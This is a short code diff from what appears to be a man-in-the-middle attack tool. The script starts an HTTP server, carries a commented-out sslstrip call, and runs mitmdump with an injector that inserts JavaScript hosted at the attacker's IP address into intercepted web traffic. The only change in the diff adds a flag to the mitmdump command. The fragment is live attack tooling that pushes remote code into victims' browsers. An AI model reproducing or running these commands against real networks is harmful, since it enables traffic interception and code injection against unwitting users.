@@ -50,7 +50,7 @@ os.system("python3 httpServer.py &")
 #os.system("sslstrip -l 8080 &")
 
 # start the mitmproxy
-os.system("mitmdump -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")
+os.system("mitmdump --no-upstream-cert -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")
 
 
 
